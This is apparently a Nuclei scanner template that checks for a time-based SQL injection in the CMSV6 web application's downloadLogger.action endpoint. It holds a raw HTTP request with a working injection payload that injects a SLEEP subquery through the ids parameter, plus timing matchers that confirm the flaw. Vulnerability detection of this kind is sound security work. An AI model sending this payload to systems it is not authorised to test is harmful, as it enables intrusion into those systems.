id: g-sky-downloadlogger-action-cmsv6-sqli
info:
  name: 通天星CMS V6 downloadLogger.action SQL Injection Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection, cmsv6

variables:
  t1: "{{rand_int(1,5)}}"
  t2: "{{to_number(t1) * 2}}"
  t3: "{{to_number(t2) + 1}}"

http:
  - raw:
      - |
        GET /run_stop/delete.do;downloadLogger.action?ids=1)+AND+(SELECT+5394+FROM+(SELECT(SLEEP({{t1}})))tdpw)--+&loadAll=1 HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "result\":0,\"message\":\"OK\""
      - type: dsl
        dsl:
          - "duration >= to_number(t2)"
          - "duration < to_number(t3)"
